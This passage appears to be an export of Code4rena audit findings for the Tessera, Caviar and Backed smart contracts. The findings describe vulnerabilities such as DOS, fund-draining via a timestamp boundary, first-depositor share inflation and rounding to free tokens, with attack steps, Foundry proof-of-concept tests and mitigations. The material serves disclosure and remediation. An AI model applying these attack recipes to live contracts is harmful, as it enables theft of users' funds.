"sponsor confirmed", "Q-04"], "target": "2022-12-tessera-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tessera-findings/blob/main/data/IllIllI-Q.md)."}, {"title": "Attacker can DOS OptimisticListing with very low cost", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/25", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-05"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L112-L116   # Vulnerability details  ## Impact  The only check on a new proposal is that it is priced lower than the existing proposal. It does not constrain on the `_collateral` supplied (except it will revert in _verifyBalance if set to 0). Anyone can block normal proposal creation by creating a proposal with lower price but _collateral == 1. When a high total supply is used, the price of each Rae is negligible and enable an attacker to DOS the protocol.  This violated the `prevent a user from holding a vault hostage and never letting the piece be reasonably bought` requirement.  ## Proof of Concept  For any proposal, an attacker can deny it with _collateral = 1 and _price = price - 1  If he do not want the NFT to be sold, he can reject the proposal himself, reseting the contract state.  https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L112-L116  ```solidity         // Reverts if price per token is not lower than both the proposed and active listings         if (             _pricePerToken >= proposedListing.pricePerToken ||             _pricePerToken >= activeListings[_vault].pricePerToken         ) revert NotLower(); ```  Add this test to OptimisticListingSeaport.t.sol:  ```     function testProposeRevertLowerTotalValue() public {         uint256 _collateral = 100;         uint256 _price = 100;         // setup         testPropose(_collateral, _price);         lowerPrice = pricePerToken - 1;         // execute         vm.expectRevert();         _propose(eve, vault, 1, lowerPrice, offer);         // expect         _assertListing(eve, 1, lowerPrice, block.timestamp);         _assertTokenBalance(eve, token, tokenId, eveTokenBalance - 1);     } ``` [FAIL. Reason: Call did not revert as expected]   ## Tools Used  Foundry  ## Recommended Mitigation Steps  Require the total value of the new collateral be greater than the previous. This however still allow a Rae holder with sufficiently large holding to block proposal by creating a new proposal and immediately reject it himself. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "selected for report", "sponsor confirmed", "edited-by-warden", "G-01"], "target": "2022-12-tessera-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tessera-findings/blob/main/data/gzeon-G.md)."}, {"title": "OptimisticListingSeaport.propose sets pendingBalances of newly added proposer instead of previous one", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/12", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/seaport/modules/OptimisticListingSeaport.sol#L126   # Vulnerability details  ## Impact In `OptimisticListingSeaport.propose`, `pendingBalances` is set to the collateral. The purpose of this is that the proposer of a previous proposal can withdraw his collateral afterwards. However, this is done on the storage variable `proposedListing` after the new listing is already set: ```solidity _setListing(proposedListing, msg.sender, _collateral, _pricePerToken, block.timestamp);  // Sets collateral amount to pending balances for withdrawal pendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral; ``` Because of that, it will actually set `pendingBalances` of the new proposer. Therefore, the old proposer loses his collateral and the new one can make proposals for free.  ## Proof Of Concept ```diff --- a/test/seaport/OptimisticListingSeaport.t.sol +++ b/test/seaport/OptimisticListingSeaport.t.sol @@ -379,8 +379,11 @@ contract OptimisticListingSeaportTest is SeaportTestUtil {      /// ===== LIST =====      /// ================      function testList(uint256 _collateral, uint256 _price) public {          // setup          testPropose(_collateral, _price); +        assertEq(optimistic.pendingBalances(vault, bob), 0);          _increaseTime(PROPOSAL_PERIOD);          _collateral = _boundCollateral(_collateral, bobTokenBalance);          _price = _boundPrice(_price); ``` This test fails and `optimistic.pendingBalances(vault, bob)` is equal to `_collateral`.  ## Recommended Mitigation Steps Run `pendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral;` before the `_setListing` call, in which case the above PoC no longer works."}, {"title": "Groupbuy: _verifyUnsuccessfulState and _verifySuccessfulState both can return true when block.timestamp == pool.terminationPeriod", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/10", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L455 https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L478   # Vulnerability details  ## Impact The functions `_verifyUnsuccessfulState` and `_verifySuccessfulState` should always have a differing behavior with regards to reversion, i.e. when one does not revert, the other should revert. In one condition, this is not true. Namely, when we have `pool.success == false` and `block.timestamp == pool.terminationPeriod`, this check within `_verifyUnsuccessfulState` is `false`: ```solidity if (pool.success || block.timestamp > pool.terminationPeriod) revert InvalidState(); ``` Similarly, this check within `_verifySuccessfulState` is also `false`: ```solidity if (!pool.success && block.timestamp < pool.terminationPeriod) revert InvalidState(); ``` Because this breaks a fundamental invariant of the contract, there are probably multiple ways to exploit it.  One way an attacker can exploit is by calling `claim` (to get his contribution back completely), bidding again with a higher value than his previous contributions (to get his contributions back again).  ## Proof Of Concept Let's assume we are at timestamp `pool.terminationPeriod`. Attacker Charlie has performed the lowest bid with quantity 10 and price 1 ETH. He calls `claim` to get his 10 ETH back. Now, he calls `contribute` with a quantity of 10 and a price of 2 ETH. Because this bid is higher than his previous one (which was the lowest one), his `pendingBalances` is set to 10 ETH (for the deleted entries) and his `userContributions` is set to 20 ETH (for this new contribution). He can now call `claim` again to get back his 20 ETH in `userContributions`, but also the 10 ETH in `pendingBalances`. Like that, he has stolen 10 ETH (and could use this attack pattern to drain the whole contract).  ## Recommended Mitigation Steps Change `<` in `_verifySuccessfulState` to `<=`."}, {"title": "GroupBuy: Lost ETH when the NFT is bought for less than the minimum reserve price", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/7", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L242   # Vulnerability details  ## Impact The `purchase` function does not require that an NFT is bought for exactly `minReservePrices[_poolId] * filledQuantities[_poolId]`, the price is only not allowed to be greater: ```solidity if (_price > minReservePrices[_poolId] * filledQuantities[_poolId])             revert InvalidPurchase(); ``` This makes sense because it is not sensible to pay more when the purchase also succeeds with a smaller amount. However, the logic within `claim` does assume that the NFT was bought for `minReservePrices[_poolId]`. It decreases from `contribution` the quantity times the reserve price for all bids: ```solidity contribution -= quantity * reservePrice; ``` Only the remaining amount is reimbursed to the user, which can lead to a loss of funds.  ## Proof Of Concept Let's say that `filledQuantities[_poolId] = 100` and `minReservePrices[_poolId]` (i.e., the lowest bid) was 1 ETH. However, it was possible to buy the NFT for only 50 ETH. When a user has contributed 20 * 1 ETH, he does not get anything back when calling `claim`, although only 10 ETH (0.5 ETH * 20) of his contributions were used to buy the NFT. The overall loss of funds for all contributors is 50 ETH.  ## Recommended Mitigation Steps Set `minReservePrices[_poolId]` to `_price / filledQuantities[_poolId]` after a purchase."}, {"title": "GroupBuy does not check return value of call", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/6", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-12-tessera-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L265 https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L283   # Vulnerability details  ## Impact Both usages of `call` do not check if the transfer of ETH was succesful: ```solidity payable(msg.sender).call{value: contribution}(\"\"); ... payable(msg.sender).call{value: balance}(\"\"); ``` This can become very problematic when the recipient is a smart contract that reverts (for instance, temporarily) in its `receive` function. Then, `GroupBuy` still assumes that this ETH was transferred out and sets the balance to 0 or deletes `userContributions[_poolId][msg.sender]`, although no ETH was transferred. This leads to a loss of funds for the recipient.  ## Proof Of Concept We assume that the recipient is a smart contract that performs some logic in its `receive` function. For instance, it can be a nice feature for some people to automatically convert all incoming ETH into another token using an AMM. However, it can happen that the used AMM has too little liquidity at the moment or the slippage of a swap would be too high, leading to a revert in the receing contract. In such a scenario, the `GroupBuy` contract still thinks that the call was succesful, leading to lost funds for the recipient.  ## Recommended Mitigation Steps `require` that the call was succesful."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tessera-findings/issues/4", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2022-12-tessera-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tessera-findings/blob/main/data/Lambda-Q.md)."}, {"title": "First depositor can break minting of shares", "html_url": "https://github.com/code-423n4/2022-12-caviar-findings/issues/442", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-03"], "target": "2022-12-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63   # Vulnerability details  ## Impact The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large \u201cdonation\u201d.  ## Proof of Concept In `Pair.add()`, the amount of LP token minted is calculated as ```solidity function addQuote(uint256 baseTokenAmount, uint256 fractionalTokenAmount) public view returns (uint256) {     uint256 lpTokenSupply = lpToken.totalSupply();     if (lpTokenSupply > 0) {         // calculate amount of lp tokens as a fraction of existing reserves         uint256 baseTokenShare = (baseTokenAmount * lpTokenSupply) / baseTokenReserves();         uint256 fractionalTokenShare = (fractionalTokenAmount * lpTokenSupply) / fractionalTokenReserves();         return Math.min(baseTokenShare, fractionalTokenShare);     } else {         // if there is no liquidity then init         return Math.sqrt(baseTokenAmount * fractionalTokenAmount);     } } ```  An attacker can exploit using these steps 1. Create and add `1 wei baseToken - 1 wei quoteToken` to the pair. At this moment, attacker is minted `1 wei LP token` because `sqrt(1 * 1) = 1` 2. Transfer large amount of `baseToken` and `quoteToken` directly to the pair, such as `1e9 baseToken - 1e9 quoteToken`. Since no new LP token is minted, `1 wei LP token` worths `1e9 baseToken - 1e9 quoteToken`. 3. Normal users add liquidity to pool will receive `0` LP token if they add less than `1e9` token because of rounding division. ```solidity baseTokenShare = (X * 1) / 1e9; fractionalTokenShare = (Y * 1) / 1e9; ```   ## Tools Used Manual Review  ## Recommended Mitigation Steps - [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `lpTokenSupply == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution. - In `add()`, ensure the number of LP tokens to be minted is non-zero: ```solidity require(lpTokenAmount != 0, \"No LP minted\"); ```  "}, {"title": "Liquidity providers may lose funds when adding liquidity", "html_url": "https://github.com/code-423n4/2022-12-caviar-findings/issues/376", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-12-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L421-L423   # Vulnerability details  ## Impact Liquidity providers may lose a portion of provided liquidity in either of the pair tokens. While the `minLpTokenAmount` protects from slippage when adding liquidity, it doesn't protect from providing liquidity at different K. ## Proof of Concept The `Pair` contract is designed to receive liquidity from liquidity providers ([Pair.sol#L63](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63)). First liquidity provider in a pool may provide arbitrary token amounts and set the initial price ([Pair.sol#L425-L426](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L425-L426)), but all other liquidity providers must provide liquidity proportionally to current pool reserves ([Pair.sol#L420-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L420-L423)). Since a pool is made of two tokens and liquidity is provided in both tokens, there's a possibility for a discrepancy: token amounts may be provided in different proportions. When this happens, the smaller of the proportions is chosen to calculate the amount of LP tokens minted ([Pair.sol#L420-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L420-L423)): ```solidity // calculate amount of lp tokens as a fraction of existing reserves uint256 baseTokenShare = (baseTokenAmount * lpTokenSupply) / baseTokenReserves(); uint256 fractionalTokenShare = (fractionalTokenAmount * lpTokenSupply) / fractionalTokenReserves(); return Math.min(baseTokenShare, fractionalTokenShare); ```  As a result, the difference in proportions will create an excess of tokens that won't be redeemable for the amount of LP tokens minted. The excess of tokens gets, basically, donated to the pool: it'll be shared among all liquidity providers of the pool. While the `minLpTokenAmount` argument of the `add` function ([Pair.sol#L63](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63)) allows liquidity providers to set the minimal amount of LP tokens they want to receive, it doesn't allow them to minimize the disproportion of token amounts or avoid it at all.  ```solidity // test/Pair/unit.Add.t.sol  function testLockOfFunds_AUDIT() public {     address alice = address(0x31337);     address bob = address(0x12345);     vm.label(alice, \"alice\");     vm.label(bob, \"bob\");      deal(address(usd), alice, 100e18, true);     deal(address(usd), bob, 100e18, true);     deal(address(p), alice, 100e18, true);     deal(address(p), bob, 100e18, true);      // Alice is the first liquidity provider.     vm.startPrank(alice);     usd.approve(address(p), type(uint256).max);     p.add(10 ether, 10 ether, 0);     vm.stopPrank();      // Bob provides liquidity to the pool and sets the minimal LP amount.     // The token amounts are deposited in different proportions, thus the smaller     // one will be chosen to calculate the amount of LP tokens Bob will receive.     vm.startPrank(bob);     usd.approve(address(p), type(uint256).max);     uint256 minLPAmount = 1e18;     uint256 bobLPAmount = p.add(1.2 ether, 1 ether, minLPAmount);     vm.stopPrank();      // Bob has received the minimal LP amount he wanted.     assertEq(bobLPAmount, minLPAmount);      // However, after removing all his liquidity from the pool...     (uint256 bobUSDBefore, uint256 bobFracBefore) = (usd.balanceOf(bob), p.balanceOf(bob));     vm.prank(bob);     p.remove(minLPAmount, 0, 0);     (uint256 bobUSDAfter, uint256 bobFracAfter) = (usd.balanceOf(bob), p.balanceOf(bob));      // ... Bob received less USD than he deposited.     assertEq(bobUSDAfter - bobUSDBefore, 1.018181818181818181 ether);     assertEq(bobFracAfter - bobFracBefore, 1.000000000000000000 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps In the `add` function, consider calculating optimal token amounts based on the amounts specified by user, current pool reserves, and the minimal LP tokens amount specified by user. As a reference, consider this piece from the Uniswap V2 Router: [UniswapV2Router02.sol#L45-L60](https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L45-L60)."}, {"title": "Rounding error in buyQuote might result in free tokens", "html_url": "https://github.com/code-423n4/2022-12-caviar-findings/issues/243", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-12-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L398-L400   # Vulnerability details  In order to guarantee the contract does not become insolvent, incoming assets should be rounded up, while outgoing assets should be rounded down.   The function `buyQuote()` calculates the amount of base tokens required to buy a given amount of fractional tokens. However, this function rounds down the required amount, which is in favor of the buyer (i.e. he/she has to provide less base tokens for the amount of receiving fractional tokens.   Depending on the amount of current token reserves and the amount of fractional tokens the user wishes to buy, it might be possible to receive free fractional tokens.  Assume the following reserve state:   - base token reserve: 0,1 WBTC (=`1e7`) - fractional token reserve: 10.000.000 (=`1e25`)  The user wishes to buy 0,9 fractional tokens (=`9e17`). Then, the function `buyQuote()` will calculate the amount of base tokens as follows:   `(9e17 * 1000 * 1e7) / ((1e25 - 9e17) * 997) = 0,903`  As division in Solidity will round down, the amount results in `0` amount of base tokens required (WBTC) to buy 0,9 fractional tokens.   ## Impact  Using the example above, 0,9 fractional tokens is a really small amount (`0,1 BTC / 1e7 = +- $0,00017`). Moreover, if the user keeps repeating this attack, the fractional token reserve becomes smaller, which will result in a buyQuote amount of >1, after which the tokens will not be free anymore.   Additionally, as the contract incorporates a fee of 30bps, it will likely not be insolvent. The downside would be the LP holder, which will receive a fee of less than 30bps. Hence, the impact is rated as medium.  ## Tool Used  Manual Review  ## Recommended Mitigation Steps  For incoming assets, it\u2019s recommended to round up the required amount. We could use solmate\u2019s `FixedPointMathLib` library to calculate the quote and round up. This way the required amount will always at least be 1 wei:  ```solidity function buyQuote(uint256 outputAmount) public view returns (uint256) {   return mulDivUp(outputAmount * 1000, baseTokenReserves(), (fractionalTokenReserves() - outputAmount) * 997); } ```"}, {"title": "Price will not always be 18 decimals, as expected and outlined in the comments", "html_url": "https://github.com/code-423n4/2022-12-caviar-findings/issues/141", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-12-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L387-L392   # Vulnerability details  ## Impact The `price()` function is expected to return the price of one fractional tokens, represented in base tokens, to 18 decimals of precision. This is laid out clearly in the comments:  > /// @notice The current price of one fractional token in base tokens with 18 decimals of precision. /// @dev Calculated by dividing the base token reserves by the fractional token reserves. /// @return price The price of one fractional token in base tokens * 1e18.  However, the formula incorrectly calculates the price to be represented in whatever number of decimals the base token is in. Since there are many common base tokens (such as USDC) that will have fewer than 18 decimals, this will create a large mismatch between expected prices and the prices that result from the function.  ## Proof of Concept  Prices are calculated with the following formula, where `ONE = 1e18`:  ```solidity return (_baseTokenReserves() * ONE) / fractionalTokenReserves(); ```  We know that `fractionalTokenReserves` will always be represented in 18 decimals. This means that the `ONE` and the  `fractionalTokenReserves` will cancel each other out, and we are left with the `baseTokenReserves` number of decimals for the final price.  As an example: - We have $1000 USDC in reserves, which at 6 decimals is 1e9 - We have 1000 fractional tokens in reserve, which at 18 decimals is 1e21 - The price calculation is `1e9 * 1e18 / 1e21 = 1e6` - While the value should be 1 token, the 1e6 will be interpreted as just 1/1e12 tokens if we expect the price to be in 1e18  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  The formula should use the decimals value of the `baseToken` to ensure that the decimals of the resulting price ends up with 18 decimals as expected:  ```solidity return (_baseTokenReserves() * 10 ** (36 - ERC20(baseToken).decimals()) / fractionalTokenReserves(); ```  This will multiple `baseTokenReserves` by 1e18, and then additionally by the gap between 1e18 and its own decimals count, which will result in the correct decimals value for the outputted price."}, {"title": "user fund loss because function purchaseLiquidationAuctionNFT() take extra liquidation penalty when user's last collateral is liquidated, (set wrong value for maxDebtCached when isLastCollateral is true)", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/255", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294   # Vulnerability details  ## Impact Function `purchaseLiquidationAuctionNFT()` purchases a liquidation auction with the controller's papr token. the liquidator pays the papr amount which is equal to price of the auction and receives the auctioned  NFT. contract would transfer paid papr and  pay borrower debt and if there is extra papr left it would be transferred to the user. for extra papr that is not required for brining user debt under max debt, contract gets liquidation penalty but in some cases (when the auctioned NFT is user's last collateral) contract take penalty from all of the transferred papr and not just the extra. so users would lose funds in those situations because of this and the fund could be big because the penalty is 10% of the price of the auction and in most cases user would lose 10% of his debt (the value of the NFT).  ## Proof of Concept This is `purchaseLiquidationAuctionNFT()` code: ```     function purchaseLiquidationAuctionNFT(         Auction calldata auction,         uint256 maxPrice,         address sendTo,         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo     ) external override {         uint256 collateralValueCached = underwritePriceForCollateral(             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count;         bool isLastCollateral = collateralValueCached == 0;          uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt;         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());         /// anything above what is needed to bring this vault under maxDebt is considered excess         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached;         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0;         uint256 remaining;          if (excess > 0) {             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);         } else {             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price);             remaining = debtCached - price;         }          if (isLastCollateral && remaining != 0) {             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         }     } ``` As you can see when `collateralValueCached` is 0 and user has no more collaterals left then the value of `isLastCollateral` set as true. and when `isLastCollateral` is true the value of `maxDebtCached` set as `debtCached` (line `maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());`) and the value of the `neededToSaveVault` would be 0 (line `neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached`) and the `excess` would be equal to `price` (in the line `excess = price > neededToSaveVault ? price - neededToSaveVault : 0`) so all the papr paid by liquidator would considered as excess and contract would get liquidation penalty out of that. so: in current implementation in last collateral liquidation all of the paid papr by liquidator would be considered excess: 1. user has no NFT left. 2. debtCached is 100. 3. collateralValueCached  is 0 and isLastCollateral is true. 4. maxDebtCached would be as debtCached which is 100. 5. neededToSaveVault would be debtCached - maxDebtCached which is 0. 6. excess would equal to price and code would take penalty out of all the price amount.  code wants to take penalty from what borrower is going to receive(other than the required amount for extra debt), but in the current implementation when it is last NFT code took fee from all of the payment. these are the steps shows how issue would harm the borrower and borrower would lose funds: (of course user debt would be set to 0 in the end, but if price was higher than user debt user won't receive the extra amount) 1. user debt is 900 and price of auction is 1000 and user has no NFT left. 2. some one pays 1000 Papr and buys the auctioned token, now user would receive 0 amount because the penalty would be 1000 * 10% = 100 and the debt is 900. 3. but penalty should be (1000-900) * 10% = 10 and user should have received 90 token.  so users would receive less amount when their last NFT is liquidated and the price is higher than debt. users would lose 10% of the their intitled fund. most users can use one token as collateral so the bug can happen most of the time.  ## Tools Used VIM  ## Recommended Mitigation Steps the code should be like this: ``` uint256 maxDebtCached = isLastCollateral ? 0: _maxDebt(collateralValueCached, updateTarget()); ```"}, {"title": "Last collateral check is not safe", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/216", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L273   # Vulnerability details  ## Impact  Liquidation might work incorrectly  ## Proof of Concept  There is a function `purchaseLiquidationAuctionNFT()` to allow liquidators to purchase NFTs on auction. In the line 273, the protocol checks if the current NFT is the last collateral using the `collateralValueCached`. But it might be possible for Reservoir Oracle to return zero (for whatever reason) and in that case `collateralValueCached` will be zero even when the `_vaultInfo[auction.nftOwner][auction.auctionAssetContract].count!=0`. One might argue that it is impossible for the Reservoir oracle to return zero output but I think it is safe not to rely on it.  ```solidity PaprController.sol 264:     function purchaseLiquidationAuctionNFT( 265:         Auction calldata auction, 266:         uint256 maxPrice, 267:         address sendTo, 268:         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo 269:     ) external override { 270:         uint256 collateralValueCached = underwritePriceForCollateral( 271:             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo 272:         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count; 273:         bool isLastCollateral = collateralValueCached == 0;//@audit not safe 274: 275:         uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt; 276:         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget()); 277:         /// anything above what is needed to bring this vault under maxDebt is considered excess 278:         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached; 279:         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);time 280:         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0; 281:         uint256 remaining; 282: 283:         if (excess > 0) { 284:             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction); 285:         } else { 286:             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price); 287:             remaining = debtCached - price; 288:         } 289: 290:         if (isLastCollateral && remaining != 0) { 291:             /// there will be debt left with no NFTs, set it to 0 292:             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining); 293:         } 294:     } 295:  ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Change the line 273 as below.  ```soliditiy bool isLastCollateral = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count == 0; ```"}, {"title": "PaprController.buyAndReduceDebt: msg.sender can lose paper by paying the debt twice", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/187", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61   # Vulnerability details  ## Impact The `PaprController.buyAndReduceDebt` function ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232)) should work like this:   1. `msg.sender` swaps some amount of the underlying token for papr token 2. This amount of papr token is used to repay debt for the address in the `account` parameter  `msg.sender` and `account` can be different addresses such that one can repay anyone's debt.    However there is a mistake in the function which leads to this behavior:   1. `msg.sender` swaps some amount of the underlying token for papr token 2. The papr token is sent to the `account` address 3. The papr token is burnt from the `msg.sender` 4. The amount of papr token burnt from the `msg.sender` is used to pay back the debt of the `account` address  The issue is that the swapped papr token are sent to `account` but the papr token are burnt from `msg.sender`.    In the best scenario when calling this function, the msg.sender does not have enough papr token to burn so the function call reverts.    In the scenario that is worse, the `msg.sender` has enough papr token to be burnt.   So the `account` address receives the swapped papr token and the debt of `account` is paid as well by the `msg.sender`.    Thereby the `msg.sender` pays double the amount he wants to.   Once by swapping his underlying tokens for papr.   The second time because his papr token are burnt.    ## Proof of Concept The `PaprController.buyAndReduceDebt` function ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232)) calls `UniswapHelpers.swap` ([https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61)):   ```solidity (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(     pool,     account,     token0IsUnderlying,     params.amount,     params.minOut,     params.sqrtPriceLimitX96,     abi.encode(msg.sender) ); ``` The second parameter which has the value `account` is the recipient of the swap.   The last parameter which is `msg.sender` is the address paying the input amount for the swap.    So the `msg.sender` pays some amount of underlying and the papr that the underlying is swapped for is sent to the `account`.    But then the debt of `account` is reduced by burning papr token from `msg.sender`:   ```solidity _reduceDebt({account: account, asset: collateralAsset, burnFrom: msg.sender, amount: amountOut}); ``` However the papr token from the swap were received by `account`. So the `msg.sender` pays twice and `account` receives twice.    ## Tools Used VSCode  ## Recommended Mitigation Steps The swapped papr token should be sent to the `msg.sender` instead of `account` such that they can then be burnt from `msg.sender`.    In order to achieve this, a single line in `PaprController.buyAndReduceDebt` must be changed:    ```solidity          (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(              pool, -            account, +            msg.sender,              token0IsUnderlying,              params.amount,              params.minOut,              params.sqrtPriceLimitX96,             abi.encode(msg.sender)         ); ```"}, {"title": "Collateral NFT deposited to a wrong address, when transferred directly to `PaprController`", "html_url": 